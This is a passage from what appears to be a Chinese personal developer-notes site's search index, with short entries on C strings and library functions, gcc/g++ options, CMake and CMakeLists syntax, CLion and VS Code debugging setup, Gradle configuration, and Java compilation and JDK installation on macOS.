是一维字符指针数组。它的每个元素都是一个指向字符串的指针。 (赋值字符串) char str[] 是一维字符数组。它的每个元素都是一个字符。(赋值字符) 将字符指针(字符串)赋值给了数组元素。每个数组元素都指向一个字符串: char *str[] = {\n    \"Hello\",\n    \"World\",\n    \"!\"\n};\n\ncout << str[0] << ' ' << str[1] << endl; // Hello World 将字符(字符值)赋值给了数组元素。数组中每个元素都是一个字符: char str[] = {\n    'H',\n    'e',\n    'l',\n    'l',\n    'o'\n};\n\ncout << str << endl; // Hello","tags":"后端","url":"/yq-docs-rear-end-from-C-++.html","loc":"/yq-docs-rear-end-from-C-++.html"},{"title":"printf与sprintf","text":"sprintf和printf在用法和功能上存在以下区别 printf(data): 将内容输出到屏幕 sprintf(var, data): 将data赋值给var, data可以是不同类型变量的格式化;\n这就是与 strcpy 的差别, strcpy 只能操作字符串 strcpy(var1, var2): Cstring_strcpy","tags":"后端","url":"/yq-docs-rear-end-from-C-library-function-Printf-and-Sprintf.html","loc":"/yq-docs-rear-end-from-C-library-function-Printf-and-Sprintf.html"},{"title":"fflush","text":"int fflush(FILE *stream) 清除读写缓冲区，用于需要立即把输出缓冲区的数据进行物理写入时 fflush()会强迫将缓冲区内的数据写回参数stream 指定的文件中.\n如果参数stream 为NULL,fflush()会将所有打开的文件数据更新","tags":"后端","url":"/yq-docs-rear-end-from-C-library-function-fflush.html","loc":"/yq-docs-rear-end-from-C-library-function-fflush.html"},{"title":"c类型","text":"char 和 wchar_t 是 C 语言中的字符类型。 char 基本的字符类型，用于表示一个字节大小的字符。\n它可以存储 ASCII 字符集中的字符，以及扩展字符集（如 Latin-1）中的字符。 wchar_t 宽字符类型，用于表示一个或多个字节的宽字符。\n它的大小可以根据编译器和平台的不同而变化，通常是 2 个或 4 个字节大小。\nwchar_t 类型用于支持更广泛的字符集，包括 Unicode 字符集。 char与wchar_t char 与 wchar_t 在 C 语言中，使用 char 类型可以处理大多数常见的字符和字符串操作。\n例如，使用 char 类型的数组可以存储和操作普通的字符串。 而在需要处理宽字符集的场景中，可以使用 wchar_t 类型和相关的宽字符函数，如 wprintf、wcscpy 等。\n这些宽字符函数可以处理多字节字符，提供对 Unicode 字符集的支持。 需要注意的是，char 和 wchar_t 之间的转换需要使用相应的转换函数，例如 mbstowcs 和 wcstombs。 在 Python 中，对于处理字符和字符串，通常使用 Unicode 字符串，因为 Python 3 默认使用 Unicode 字符串。\n在 ctypes 中，可以使用 c_char 和 c_wchar 类型来与 C 的 char 和 wchar_t 进行交互。","tags":"后端","url":"/yq-docs-rear-end-from-C-type.html","loc":"/yq-docs-rear-end-from-C-type.html"},{"title":"gcc/g++","text":"最浅显是认识是: gcc 用于 c 语言 g++ 用于 c++ 但是这个认识是错的, 也不说全错, 正确的认识是: g++以及gcc的区别 大致: GCC:GNU Compiler Collection(GUN 编译器集合)，它可以编译C、C++、JAV、Fortran、Pascal、Object-C等语言。 Compiler 编译程序，gcc/g++/cc 用来编译源代码文件，通常通过 gcc 调用 g++ 或 cc 命令； Assemblers 汇编程序，编译汇编程序，通常通过 gcc 调用 as 命令； Linkers 链接程序，用来链接编译输出的目标文件，生成可执行程序，通常通过 gcc 调用 ld 命令，还有 ar 命令生成链接库； GCC 编译套件不仅支持 C/C++，支持各种 C/C++ 方言标准，还支持 Go 或 Object-C/C++ 等，并且支持 x86、x86_64、ARM 等多种 CPU 架构。提供 gcc 命令相当于一个门户，它本身就是 C 语言编译器，并且通过它可以调用整个编译流程中会使用到的各种命令。它可以识别各种 C/C++ 源文件的扩展名，并将相应参数传给相应的命令，如果是 C++ 源代码，则执行 g++ 命令。 另外， cc 是 Unix 系统的 C Compiler，一个是古老的 C 编译器命令。Linux 的 cc 一般是一个符号连接，指向 gcc，可以通过 ls -l /usr/bin/cc 来查看。 注意，直接使用 g++ 编译 C 语言源代码会被当作 C++ 源代码处理。 例如，编译 C 语言为汇编程序，不生成目标文件和可执行程序，只需要执行命令时使用 -S ： gcc是GCC中的GUN C Compiler（C 编译器） g++是GCC中的GUN C++ Compiler（C++编译器） gcc和g++的主要区别: 对于 .c和 .cpp文件，gcc分别当做c和cpp文件编译（c和cpp的语法强度是不一样的） 对于 .c和 .cpp文件，g++则统一当做cpp文件编译 使用g++编译文件时，g++会自动链接标准库STL，而gcc不会自动链接STL gcc在编译C文件时，可使用的预定义宏是比较少的 gcc在编译cpp文件时/g++在编译c文件和cpp文件时（这时候gcc和g++调用的都是cpp文件的编译器），会加入一些额外的宏。 在用gcc编译c++文件时，为了能够使用STL，需要加参数 –lstdc++ ，但这并不代表 gcc –lstdc++ 和 g++等价，它们的区别不仅仅是这个。 gcc 选项 -I <dir> 指定头文件所在目录, 会优先找此处指定的目录 -l <dir> 指定库路径. 指定需要链接的库名，用于告诉链接器需要链接哪些库文件 -L <dir> 指定库文件所在目录 -f no-lto 禁用链接时优化（LTO）\n当使用该选项编译源代码时，编译器将不会进行链接时优化，\n这可能会导致一些性能上的损失，但也可以避免某些链接错误。 注解 -fno-lto 主要用于使用的链接文件是由其他版本LTO的gcc编译时导致无法继续编译时候吧 网上看到一篇不错的说明: gcc命令行详解 gcc 相关环境变量 CC CC 在Linux系统中，CC是一个环境变量，用于指定默认的C编译器。\n当你在终端中输入gcc命令时，实际上是使用了CC环境变量中指定的编译器。\nCC环境变量通常被设置为gcc或clang等编译器的路径，例如： CC=/usr/bin/gcc 这表示默认使用GCC作为C编译器。如果你想使用Clang作为C编译器，则可以将CC环境变量的值设置为Clang的路径。 注解 修改CC环境变量可能会影响整个系统的行为。因此，在更改它之前，请确保你知道自己在做什么，并且进行充分的测试和确认。 如果你想修改GCC运行时默认添加的参数，可以使用环境变量 CFLAGS 和 LDFLAGS CFLAGS CFLAGS环境变量用于 指定编译器（例如gcc）的默认编译选项 .\n它通常包含一系列的标志，例如优化级别、调试信息等等。\n如果你想添加或修改默认的编译选项，可以设置CFLAGS环境变量。例如: CFLAGS=\"-O3 -Wall\" 这里将优化级别设置为-O3，并启用所有警告信息（-Wall）。需要注意的是, 修改CFLAGS环境变量会对整个系统生效 LDFLAGS LDFLAGS环境变量用于 指定链接器（例如ld）的默认链接选项 .\n它通常包含一系列的标志，例如库文件路径、静态链接选项、动态链接选项等等。\n如果你想添加或修改默认的链接选项，可以设置LDFLAGS环境变量。例如: LDFLAGS=\"-L/path/to/library/files -lmymath\" 这里将库文件路径设置为/path/to/library/files，并链接一个名为libmymath.so的共享库文件。\n需要注意的是，修改LDFLAGS环境变量会对整个系统生效。 需要注意的是，在设置CFLAGS和LDFLAGS环境变量时，应该尽可能避免重复的标志。如果同一个标志被多次指定，可能会导致编译或链接错误。 头文件相关环境变量 在Linux中, 有四个环境变量可以用来设置预处理阶段头文件搜索路径: C_INCLUDE_PATH（用于C语言） CPP_INCLUDE_PATH（用于C++） CPATH（都可以用） OBJC_INCLUDE_PATH 注意Linux中, 它们的取值可以是一组用:分割开的地址列表, 类似于环境变量PATH pkg-config 当需要指定的头文件目录非常多时, 全部写在参数就非常麻烦, 于是可以用: pkg-config 示例, 查看头文件库文件路径: yanque@yanquedembp ~ % pkg-config --cflags glib-2.0\n-I/usr/local/Cellar/glib/2.70.4/include/glib-2.0 -I/usr/local/Cellar/glib/2.70.4/lib/glib-2.0/include -I/usr/local/opt/gettext/include -I/usr/local/Cellar/pcre/8.45/include\nyanque@yanquedembp ~ %\nyanque@yanquedembp ~ % pkg-config --libs glib-2.0\n-L/usr/local/Cellar/glib/2.70.4/lib -L/usr/local/opt/gettext/lib -lglib-2.0 -lintl ld与gcc联系 ld和C编译器（如gcc）都是GNU编译工具链的一部分，但它们的作用有所不同。 C编译器主要用于将源代码编译成目标文件 ，这些目标文件可以是机器码或汇编代码。\n在编译源代码过程中，C编译器会对代码进行语法分析和类型检查，并生成可执行文件所需的符号表、重定位表等信息。\n同时，C编译器还会将源代码中使用到的库文件链接到可执行文件中，以便程序能够正确地运行。 链接器（ld）则主要用于将多个目标文件链接成一个可执行文件或共享库 。\n在链接过程中，链接器会根据符号表和重定位表等信息，将不同的目标文件合并为一个整体，\n并解决各种符号引用和地址重定位问题，最终生成可执行文件或共享库。 需要注意的是, 在Linux系统中, 链接器通常由C编译器自动调用 。\n也就是说，在编译源代码时，C编译器会自动调用链接器来生成可执行文件。因此，在使用gcc编译时，你无需手动调用链接器。 msvc 与gcc类似, 是msvc 微软的一个闭源编译器, 仅支持Windows,\n也不支持高版本的语言特性/标准, 不过提供了与编译头文件等技术加快编译速度 编译后的文件说明 .a文件, 静态库文件 .o文件, 对象文件, 目标文件 .so文件, 共享库文件 一般使用g++编译, 默认生成的就是 .o 文件, 表示一个对象文件,\n是单个源代码文件编译后的结果. 需要在链接过程中和其他 .o 文件或者库文件链接到一起,生成可执行文件.\n用于动态链接,生成可执行文件较小但运行时还需要原来的 .o 文件.\n动态链接的优点是可执行文件较小, 运行时对环境依赖性更强. .a 文件由多个 .o 文件聚合而成, 用于静态链接, 生成可执行文件较大但运行时不需要 .a 文件.\n静态链接的优点是运行更快,但可执行文件较大. 如将当前目录下所有 .o 文件打包为静态库文件( .m 文件): ar -rc res.m *.o ar使用可见 ar","tags":"后端","url":"/yq-docs-rear-end-from-GCC-(++)-compiler.html","loc":"/yq-docs-rear-end-from-GCC-(++)-compiler.html"},{"title":"一些关键字","text":"extern 在声明之前, 先引用同一个文件中的变量,\n如: extern int num;\nprintf(\"%d\",num);\n\nint num = 3; 引用另一个文件中的变量/函数","tags":"后端","url":"/yq-docs-rear-end-from-Some-keywords.html","loc":"/yq-docs-rear-end-from-Some-keywords.html"},{"title":"string.h","text":"strcpy strcpy(a, b): 相当于python的值传递赋值, 把b复制一份给a strcat strcat(a, b): 字符串原地拼接, 相当于python的 a = a+b strlen size_t strlen(const char *str) 获取字符串长度 strtok char *strtok(char *s, const char *delim); 字符串分割函数 s是指向要分割的字符串的指针，delim是包含分隔符字符的字符串;\n线程不安全的，如果需要在多线程环境中使用,\n应当使用strtok_r函数或者其他线程安全的替代函数 会同步修改原有字符串s. 将一个字符串拆分成多个子字符串, 需要进行多次字符串拆分时,\n第一次调用时传入原始字符串，并在后续的调用中传入 NULL 作为第一个参数: char str[] = \"it is test!\";\nchar *token;\n\n// 使用空格作为分隔符\ntoken = strtok(str, \" \");\n\n// 后续用NULL即可\nwhile (token != NULL) {\n    printf(\"%s\\n\", token);\n    token = strtok(NULL, \" \");\n} 这是因为 strtok 函数会在原始字符串上插入空字符（0）来截断子字符串.\n第一次调用时，它会从原始字符串开始处理，并返回第一个子字符串的指针;\n后续传入 NULL 作为第一个参数, 告诉 strtok 函数继续从上一次截断的位置开始处理，并返回下一个子字符串的指针\n(必须保证原始字符串是可修改的) 注解 特别要注意分割处理后原字符串 str 会变，变成第一个子字符串, 分割字符会被替换为 \"0\": #include <string.h>\n#include <stdio.h>\n\nint main()\n{\n    char str[80] = \"This is - www.runoob.com - website\";\n    const char s[2] = \"-\";\n    char *token;\n\n    /* 获取第一个子字符串 */\n    token = strtok(str, s);\n\n    /* 继续获取其他的子字符串 */\n    while (token != NULL)\n    {\n        printf(\"%s\\n\", token);\n\n        token = strtok(NULL, s);\n    }\n    printf(\"\\n\");\n    for (int i = 0; i < 34;i++)\n        printf(\"%c\", str[i]);\n\n    return (0);\n} 输出: This is\n  www.runoob.com\n  website\n\nThis is  www.runoob.com  website","tags":"后端","url":"/yq-docs-rear-end-from-Standard-library-string-h.html","loc":"/yq-docs-rear-end-from-Standard-library-string-h.html"},{"title":"使用CLion遇到的坑","text":"c(++)的项目根据不同的编译方式, 可以分为几类项目: cmake makefile compilation database gradle 官网指引:: https://www.jetbrains.com/help/clion/clion-quick-start-guide.html#open-create-prj https://www.jetbrains.com/zh-cn/clion/features/start-your-project.html 暂且只说cmake项目 配置 对于CLion而言, 需要配置的主要有以下几个地方: 工具链\n在此处指定make, gcc, g++ 的路径 cmake\n指定本cmake项目使用哪一个配置的工具链 CMakeLists.txt\nCMakeLists.txt位于项目根目录下, 里面写明了如何构建环境. 比如环境变量, 如何运行都依赖此文件. 工具链和cmake 注解 若无cmake需要自行下载安装, 正常直接执行: xcode-select --install 安装好绑定的工具即可(不过我用的时候, 这样生成的默认构建工具ninja使用的时候有些问题). 若需要自行安装cmake官网版本, 可参考 cmake 打开项目 对于cmake项目而言, 打开项目时, 项目根目录下一定要有 CMakeLists.txt 文件. CLion会根据, 且只会根据此文件去编译项目, 类似在项目根目录下执行以下指令: mkdir cmake-build-debug && cd cmake-build-debug && cmake ../ 然后会生成一个可执行的配置(就是右上角那个绿色三角形了) 找不到项目头文件 打开 CMakeLists.txt , 在其中加入头文件搜索路径, 多个路径直接换行即可: include_directories(\n  path1\n  path2\n  ...\n) 将CLion项目转换为VS工程 根目录下执行: mkdir build\ncd build\ncmake -G \"Visual Studio 16 2019\" -A x64 .. 参考:: https://www.coder.work/article/7296599 cmake详解:: https://www.cnblogs.com/kuliuheng/p/9431275.html 注解 cmake 与 make 相比能够更好的实现跨平台的兼容. cmake: 根据 CMakeLists.txt 生成适配不同平台的 makefile, 再根据此makefile去执行编译\nmakefile: 直接根据makefile内容编译生成","tags":"后端","url":"/yq-docs-rear-end-from-Use-CLION.html","loc":"/yq-docs-rear-end-from-Use-CLION.html"},{"title":"cmake","text":"安装 下载地址: https://cmake.org/download/ 执行以下命令设置环境变量: sudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install 例如这样的输出: yanque@yanquedembp PlantsVsZombies % sudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install\nPassword:\nLinked: '/usr/local/bin/cmake' -> '/Applications/CMake.app/Contents/bin/cmake'\nLinked: '/usr/local/bin/ctest' -> '/Applications/CMake.app/Contents/bin/ctest'\nLinked: '/usr/local/bin/cpack' -> '/Applications/CMake.app/Contents/bin/cpack'\nLinked: '/usr/local/bin/cmake-gui' -> '/Applications/CMake.app/Contents/bin/cmake-gui'\nLinked: '/usr/local/bin/ccmake' -> '/Applications/CMake.app/Contents/bin/ccmake'\nyanque@yanquedembp PlantsVsZombies % 基本语法 注释: 使用# 命令不区分大小写, 变量区分大小写 定义变量: set\n- 定义字符串: set(var1 str_data)\n- 定义列表: set(var_list var1 var2 var3 ...)\n- bool: True就是ON, False就是OFF, 如set(bool_var OFF)\n- 使用美元符加花括号 ${} 来访问定义的变量, 若使用与if语句, 则不需要, 直接使用变量名称即可\n- 访问环境变量: 与普通变量相比, 需要加上 ENV, 如$ENV{VariableName} 打印输出: 使用 message, 如message(\"var=${var}\") project(<projectname> [languageName1 languageName2 ...]) 指定项目名称, 如指定项目为Game: project(Game) cmake_minimum_requried(VERSION major[.minor[.patch) 用于指定需要的CMake的最低版本, 如指定最低使用2.8版本: cmake_minimum_requried(VERSION 2.8) aux_source_directory(<dir> <variable>) 用于将dir目录下的所有源文件的名字保存在变量variable中, 如: aux_source_directory(${CMAKE_CURRENT_SOURCE_DIR}/src  DIR_SRCS) add_executable(<name> [WIN32] [MACOSX_BUNDLE][EXCLUDE_FROM_ALL] source1 source2 … sourceN) 用于指定从一组源文件source1 source2 ... sourceN 编译出一个可执行文件且命名为name 使用范例: add_executable(Main $(DIR_SRCS)) add_library([STATIC | SHARED | MODULE] [EXCLUDE_FROM_ALL] source1source2 … sourceN) 用于指定从一组源文件 source1 source2 ... sourceN编译出一个库文件且命名为name 使用范例: add_library(Lib $(DIR_SRCS)) add_dependencies(target-name depend-target1 depend-target2 …) 用于指定某个目标（可执行文件或者库文件）依赖于其他的目标。这里的目标必须是add_executable、add_library、add_custom_target命令创建的目标 add_subdirectory(source_dir [binary_dir] [EXCLUDE_FROM_ALL]) 用于添加一个需要进行构建的子目录 使用范例: add_subdirectory(Lib) target_link_libraries(<target> [item1 [item2 […]]][[debug|optimized|general] ] …) 用于指定target需要链接item1 item2 ...。这里target必须已经被创建，链接的item可以是已经存在的target（依赖关系会自动添加） 使用范例: target_link_libraries(Main Lib) set(<variable> <value> [[CACHE <type><docstring> [FORCE]] | PARENT_SCOPE]) 用于设定变量 variable 的值为 value。如果指定了 CACHE 变量将被放入 Cache（缓存）中。 使用范例: set(ProjectName Main) unset(<variable> [CACHE]) 用于移除变量 variable。如果指定了 CACHE 变量将被从 Cache 中移除。 使用范例: unset(VAR CACHE) message([STATUS|WARNING|AUTHOR_WARNING|FATAL_ERROR|SEND_ERROR] \"message todisplay\"…) 用于输出信息 使用范例: message(\"Hello World\") include_directories([AFTER|BEFORE] [SYSTEM] dir1 dir2 …) 用于设定目录，这些设定的目录将被编译器用来查找 include 文件 使用范例: include_directories(${PROJECT_SOURCE_DIR}/lib) find_path(<VAR> name1 [path1 path2 …]) 用于查找包含文件name1的路径，如果找到则将路径保存在VAR中（此路径为一个绝对路径），如果没有找到则结果为<VAR>-NOTFOUND.默认情况下，VAR会被保存在Cache中，这时候我们需要清除VAR才可以进行下一次查询（使用unset命令）: find_path(LUA_INCLUDE_PATH lua.h ${LUA_INCLUDE_FIND_PATH})\nif(NOT LUA_INCLUDE_PATH)\n        message(SEND_ERROR \"Header file lua.h not found\")\nendif() find_library(<VAR> name1 [path1 path2 …]) 用于查找库文件 name1 的路径，如果找到则将路径保存在 VAR 中（此路径为一个绝对路径），如果没有找到则结果为 <VAR>-NOTFOUND。一个类似的命令 link_directories 已经不太建议使用了 add_definitions(-DFOO -DBAR …) 用于添加编译器命令行标志（选项），通常的情况下我们使用其来添加预处理器定义 使用范例: add_definitions(-D_UNICODE -DUNICODE) file 命令简述：此命令提供了丰富的文件和目录的相关操作（这里仅说一下比较常用的）\n使用范例: # 目录的遍历\n# GLOB 用于产生一个文件（目录）路径列表并保存在variable 中\n# 文件路径列表中的每个文件的文件名都能匹配globbing expressions（非正则表达式，但是类似）\n# 如果指定了 RELATIVE 路径，那么返回的文件路径列表中的路径为相对于 RELATIVE 的路径\nfile(GLOB variable [RELATIVE path][globbing expressions]...)\n\n# 获取当前目录下的所有的文件（目录）的路径并保存到 ALL_FILE_PATH 变量中\nfile(GLOB ALL_FILE_PATH ./*)\n# 获取当前目录下的 .h 文件的文件名并保存到ALL_H_FILE 变量中\n# 这里的变量CMAKE_CURRENT_LIST_DIR 表示正在处理的 CMakeLists.txt 文件的所在的目录的绝对路径（2.8.3 以及以后版本才支持）\nfile(GLOB ALL_H_FILE RELATIVE${CMAKE_CURRENT_LIST_DIR} ${CMAKE_CURRENT_LIST_DIR}/*.h) 常用变量 常用变量: UNIX    如果为真，表示为UNIX-like的系统，包括AppleOSX和CygWin\nWIN32   如果为真，表示为 Windows 系统，包括 CygWin\nAPPLE   如果为真，表示为 Apple 系统\nCMAKE_SIZEOF_VOID_P                     表示void*的大小（例如为4或者8），可以使用其来判断当前构建为32位还是64位\nCMAKE_CURRENT_LIST_DIR                  表示正在处理的CMakeLists.txt文件的所在的目录的绝对路径(2.8.3以及以后版本才支持)\nCMAKE_ARCHIVE_OUTPUT_DIRECTORY  用于设置ARCHIVE目标的输出路径\nCMAKE_LIBRARY_OUTPUT_DIRECTORY  用于设置LIBRARY目标的输出路径\nCMAKE_RUNTIME_OUTPUT_DIRECTORY  用于设置RUNTIME目标的输出路径 参考:: https://blog.csdn.net/qq_23123181/article/details/122736393?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122736393-blog-80902807.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122736393-blog-80902807.pc_relevant_recovery_v2&utm_relevant_index=3 https://blog.csdn.net/zhanghm1995/article/details/80902807","tags":"后端","url":"/yq-docs-rear-end-from-cmake.html","loc":"/yq-docs-rear-end-from-cmake.html"},{"title":"cmakelists.txt编写","text":"cmakelists.txt是基于cmake指令的. 普通变量 使用 set(var value) 赋值, 使用 ${} 方式取值,但是在IF控制语句中是直接使用变量名 获取环境变量 使用 $ENV{} 方式取值,使用 SET(ENV{VAR} VALUE) 赋值 定义bool变量 使用 set, 以下相当 bool DEBUG = True SET(DEBUG ON) OFF 就是 False 注解 像set这种关键字不区分大小写, 但是变量名区分大小写; 使用 if 语句时, 直接使用变量名, 不需要用花括号包裹 打印输出 使用 MESSAGE MESSAGE(\"DEBUG=\" ${DEBUG}) 执行cmake指令 使用execute_process 创建文件夹 使用 execute_process, 创建一个newdir, 注意定义 new_dir: execute_process( COMMAND ${CMAKE_COMMAND} -E make_directory ${new_dir}) 复制文件夹 使用 execute_process, 将dir1复制到dir2, 注意定义 dir1 dir2: execute_process( COMMAND ${CMAKE_COMMAND} -E copy_directory ${dir1} ${dir2}) 复制文件 使用 execute_process, 将file1复制到file2, 注意定义 file1 file2: execute_process( COMMAND ${CMAKE_COMMAND} -E copy ${file1} ${file2}) 添加子目录的CMakeLists.txt 如, 在根目录下, 新建Stack目录, 在Stack中建立一个CMakeLists.txt文件 根目录需增加如下语句: add_subdirectory(Stack) 更多见: cmake","tags":"后端","url":"/yq-docs-rear-end-from-cmakelists.html","loc":"/yq-docs-rear-end-from-cmakelists.html"},{"title":"vscode调试相关","text":"调试命令工具 gdb lldb 注解 lldb 是mac上才有的, xcode低版本使用的是gdb调试, 高版本换成了内置lldb 另外, gcc 与 g++ 是编译为可执行文件的, gdb与lldb才是调试工具. 指令区别: lldb与gdb命令名的对照表 配置经验 创建launch.json调试器, 支持直接调试与附加调试(这个配置是给左侧的调试器使用的) 例: {\n        \"version\": \"0.2.0\",\n        \"configurations\": [\n                {\n                        \"name\": \"(lldb) 启动\",\n                        \"type\": \"cppdbg\",\n                        \"request\": \"launch\",\n                        \"program\": \"${fileDirname}/.debug/${fileBasenameNoExtension}.out\",\n                        \"args\": [],\n                        \"stopAtEntry\": false,\n                        \"cwd\": \"${fileDirname}\",\n                        \"environment\": [],\n                        \"externalConsole\": false,\n                        \"MIMode\": \"lldb\",\n                        \"preLaunchTask\": \"pre build\"\n                }\n        ]\n} 类似c/c++程序, 调试之前需要先编译为可执行文件, 这个时候就需要用到task.json配置任务, 此处的 label 与 launch.json 的 preLaunchTask 保持一致 例: {\n        \"tasks\": [\n                {\n                        \"label\": \"pre build\",\n                        \"type\": \"cppbuild\",\n                        \"command\": \"/usr/bin/g++\",\n                        \"args\": [\n                                \"-fdiagnostics-color=always\",\n                                \"-g\",\n                                \"${file}\",\n                                \"-o\",\n                                \"${fileDirname}/.debug/${fileBasenameNoExtension}.out\"\n                        ],\n                        \"options\": {\n                                \"cwd\": \"${fileDirname}\"\n                        },\n                        \"problemMatcher\": [\n                                \"$gcc\"\n                        ],\n                        \"group\": {\n                                \"kind\": \"build\",\n                                \"isDefault\": true\n                        },\n                        \"detail\": \"调试器生成的任务。\"\n                }\n        ],\n        \"version\": \"2.0.0\"\n} 注解 gcc指定输出位置的时候, 有bug..., 会导致卡住. 另外右上角的启动调试与左边的不是一个东西. F5启动的也是左边配置的. 也就是, F5启动的是json配置的调试, 直接右上角run是内置的直接执行编译运行指令(不过编译那一步会写到task.json种). 配置文件说明 launch.json 这个可以不用设置, 直接使用task.json里任务生成输出文件 task.json 用来配置任务, 可在launch.json里配置什么时候掉用 c_cpp_properties.json 用于给插件配置, 比如使用的 include_path, 注意这里只是给插件使用的, 如果需要执行或者编译的时候使用需要自定义编译时候的参数, 如 g++ -L 指定库路径 注解 注意 c_cpp_properties 配置的 include_path 不能用于执行时使用. 执行时候只能自定义参数, 可以通过在 setting.json 配置 code-runner.executorMap 处理. 其他 可以选择小三角形的启动方式 启动选项 可以通过设置选择启动选项相对应的任务 选择启动选项实际的执行","tags":"后端","url":"/yq-docs-rear-end-from-vSCode-debugging-related.html","loc":"/yq-docs-rear-end-from-vSCode-debugging-related.html"},{"title":"资源文件介绍","text":"res/layout/main.xml App主窗体布局文件，应用长什么样都在这边定义，有Design和Text两种模式 res/values/strings.xml 可以理解为i18n文件，用来存放程序调用的各种字符串 src/com/example/helloandroid/MyActivity.java 主程序类，要实现的功能都在这个文件里添加","tags":"后端","url":"/yq-docs-rear-end-java-Android-development-Resource-file-introduction.html","loc":"/yq-docs-rear-end-java-Android-development-Resource-file-introduction.html"},{"title":"配置文件说明","text":"build.gradle settings.gradle 注解 settings.gradle 编译优先级高于build.gradle build.gradle build.gradle 是项目构建所使用的脚本。 settings.gradle settings.gradle 必要的一些设置，例如，任务或项目之间的依懒关系等 settings.gradle是模块Module配置文件，主要是用于配置子模块，\n根目录下的setting.gradle脚本文件是针对module的全局配置, 如: // 为指定父模块的名称 平台根\nrootProject.name = 'project-root'\n//包含子系统以及模块\ninclude ':project-core'\n//Hello系统模块的加载\ninclude ':project-hello'\n//World系统模块的加载\ninclude ':project-world' 单项目构建该文件可选，多项目构建必须, 因为需要在这个文件中声明哪些子项目需要参与构建，也包括子项目路径、名称等.\n多项目的构建原则:\n如果该构建目录中存在settings.gradle文件，那么就依据该文件来进行构建；\n如果不存在该文件，那么会向上一级目录查询文件是否存在(注意：只会向父目录查询，而不是一直向上级目录递归查询)，\n如果存在就依据该文件进行构建，否则此次构建就是一个单项目的构建 文件结构及其配置 plugins: 需要引进的相关插件Plugins, 此处调用了 PluginDependenciesSpec 中的 id 方法, 如: // 需要引进的相关插件Plugins\nplugins {\n    // 'com.android.application' 表示应用com.android.application插件\n    id 'com.android.application'\n} repositories: 仓库配置, 用于存储依赖(从哪下载依赖), 如: // repositories闭包  存储库\n// 声明在何处查找项目的依赖项\nrepositories {\n//    指定使用maven本地仓库，而本地仓库在配置maven时setting文件指定的仓库位置。\n    mavenLocal()\n\n    maven {\n        name \"aliyun\"\n        url \"https://maven.aliyun.com/repository/gradle-plugin\"\n    }\n\n    // 这是Maven的中央仓库，无需配置，直接声明就可以使用\n    mavenCentral()\n\n    // JCenter中央仓库，实际也是是用的maven搭建的，但相比Maven仓库更友好，通过CDN分发，并且支持https访问。\n    // jcenter()\n} dependencies: 依赖声明, 如: // dependencies闭包  依赖\n// 是用于声明这个项目依赖于哪些jar\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-web'\n} gradle.properties 定义一些执行的属性 脚本位置一般在 $GRADLE_USER_HOME/ 目录下. 但, 我的Mac个人目录下有一个 .gradle , 这下面有一个,\n貌似是如果没设置, 默认就是这个目录? 暂时还没看到有说明. 可参考官网文档: https://docs.gradle.org/current/userguide/build_environment.html init.gradle 初始化时执行的脚本, 详情可参考: https://docs.gradle.org/current/userguide/init_scripts.html 到这里的时候, 想起安装时候有看到说设置环境变量 GRADLE_HOME , 目前为止貌似没看到官方文档有提到用处 使用方式 可以通过命令行参数 -I 或者 --init-script 跟文件路径来指定, 支持多个, 也可以直接将其文件放在 $GRADLE_USER_HOME/ 目录下. (需提前设置此环境变量) 若有多个文件, 可以将其命令为以 .gradle 结尾的文件, 然后放到 $GRADLE_USER_HOME/init.d/ 目录下. 脚本支持的内容, 如build.gradle: repositories {\n    mavenCentral()\n}\n\ntasks.register('showRepos') {\n    def repositoryNames = repositories.collect { it.name }\n    doLast {\n        println \"All repos:\"\n        println repositoryNames\n    }\n} 设置源大抵也得放到这里, 不过我机器使用官方的源也挺快, 就没设置. 如init.gradle: allprojects {\n    repositories {\n        mavenLocal()\n    }\n}\n\n// 声明额外依赖\ninitscript {\n    repositories {\n        mavenCentral()\n    }\n    dependencies {\n        classpath 'org.apache.commons:commons-math:2.0'\n    }\n} 之前冲浪看到有人说高版本已经废弃了allprojects, 但是官网文档还有这个... 然后使用命令行可以这么: > gradle --init-script init.gradle -q showRepos\nAll repos:\n[MavenLocal, MavenRepo] 工作流程 工作流程: 初始化阶段(首先解析settings.gradle)\n\n            ==》\n\nConfigration阶段(解析每个Project中的build.gradle，解析过程中并不会执行各个build.gradle中的task) 一个 Project 包含很多 Task, 每个 Task 之间有依赖关系","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools-Gradle-Configuration-file-description.html","loc":"/yq-docs-rear-end-java-Build-tools-Gradle-Configuration-file-description.html"},{"title":"相关环境变量说明","text":"","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools-Gradle-Related-environment-variable-description.html","loc":"/yq-docs-rear-end-java-Build-tools-Gradle-Related-environment-variable-description.html"},{"title":"java文件的编译执行","text":"很久没用java, 在vscode里写测试都忘了类名需要与文件名一致... 以, test_run.java 文件为例. 编译class文件, -d指定输出目录: javac -d __javacache__ test_run.java 运行, 无需class后缀, 若自定义了输出路径, 需要使用 -cp 指定查找路径: java -cp __javacache__ test_run","tags":"后端","url":"/yq-docs-rear-end-java-Compile-execution.html","loc":"/yq-docs-rear-end-java-Compile-execution.html"},{"title":"IDEA配置Gradle项目","text":"主要注意版本匹配的问题, 如: gradle与java版本之间要对应","tags":"后端","url":"/yq-docs-rear-end-java-Idea-configuration-Gradle-project.html","loc":"/yq-docs-rear-end-java-Idea-configuration-Gradle-project.html"},{"title":"Java安装配置","text":"可官网下载: https://www.oracle.com/cn/java/technologies/downloads/#java20 解压后需要设置的环境变量: JAVA_HOME, 就是安装目录 PATH, 就是 安装目录/bin. (当键盘键入java时, 会找这个目录下的java) 特殊说明-Mac下Java安装的说明 当前系统: MacOs13 使用Java的时候发现系统有一个默认的 /usr/bin/java , 无法删除, 据说即使想办法删掉后,\n重启后还会自己恢复. 所以最开始, 是直接把环境变量的JAVA_HOME写到所有环境变量的前面来解决的.\n后面偶然发现这个不是主要原因. 仅以Mac下的 /usr/bin/java 来说明, 同目录下的其它文件可能也是这个原理, 还没测试过... /usr/bin/java 会默认去找 /Library/Java/JavaVirtualMachines 下面安装好的JDK,\n故, 若使用的是压缩包什么的安装在了其它目录, 需要移动到这个目录下面, 或者软链接过来,\n比如我下载的JDK20解压包在 /usr/local/java/jdk-20.0.1.jdk , 使用以下命令链接: sudo ln -sn /usr/local/java/jdk-20.0.1.jdk 